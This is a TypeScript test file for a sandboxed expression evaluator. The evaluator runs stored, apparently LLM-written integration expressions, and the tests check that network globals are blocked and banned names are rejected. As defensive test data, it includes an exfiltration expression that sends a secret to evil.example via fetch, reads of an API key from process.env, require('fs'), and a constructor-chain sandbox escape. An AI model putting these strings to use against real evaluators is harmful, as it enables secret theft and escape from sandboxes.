// The AST gate in safe-eval is a DENYLIST of identifier names, which never
// covered the network sinks Node exposes as plain globals: `fetch(...)` contains
// no banned token, so it parsed clean and then ran server-side from the trusted
// process, entirely outside the SSRF guard.
//
// That is most dangerous for expressions an LLM authors and we STORE and re-run:
// an `api_integrations` output expression (src/lib/apis/integrations.ts) is
// model-written and evaluated on every call of that integration. These tests lock
// both layers — AST-banned names rejected at validation, network/module globals
// shadowed to `undefined` inside the evaluated body.

import { describe, it, expect } from 'vitest';
import { safeFunction, UnsafeExpressionError } from './safe-eval';

describe('safeFunction — legitimate expressions still work', () => {
  it('evaluates arithmetic over the declared args (the openrouter "remaining" case)', () => {
    const fn = safeFunction(['json'], 'return (json.data.total_credits - json.data.total_usage)');
    expect(fn({ data: { total_credits: 60, total_usage: 41.9 } })).toBeCloseTo(18.1, 5);
  });

  it('keeps the maths/formatting globals available', () => {
    expect(safeFunction(['json'], 'return Math.round(json.x)')({ x: 2.6 })).toBe(3);
    expect(safeFunction(['json'], 'return Number(json.x) + 1')({ x: '4' })).toBe(5);
    expect(safeFunction(['json'], 'return JSON.stringify(json)')({ a: 1 })).toBe('{"a":1}');
    expect(safeFunction(['input'], 'return input.values.remaining < 10')({ values: { remaining: 4 } })).toBe(true);
  });

  it('passes only the declared args through, ignoring the shadow slots', () => {
    expect(safeFunction(['a', 'b'], 'return [a, b]')(1, 2)).toEqual([1, 2]);
  });
});

describe('safeFunction — network sinks are unreachable', () => {
  for (const g of ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'Request', 'Response', 'Buffer']) {
    it(`${g} is undefined inside an evaluated body`, () => {
      expect(safeFunction(['json'], `return typeof ${g}`)({})).toBe('undefined');
    });
  }

  it('a stored exfiltration expression cannot call out', () => {
    const fn = safeFunction(['json'], 'return fetch("https://evil.example/?x=" + json.k)');
    expect(() => fn({ k: 'secret-value' })).toThrow(/not a function/);
  });
});

describe('safeFunction — AST-banned names are rejected before execution', () => {
  for (const expr of [
    'require("fs")',
    'process.env.OPENROUTER_API_KEY',
    'globalThis.fetch("x")',
    'json.constructor.constructor("return process")()',
  ]) {
    it(`rejects: ${expr}`, () => {
      expect(() => safeFunction(['json'], `return ${expr}`)).toThrow(UnsafeExpressionError);
    });
  }
});
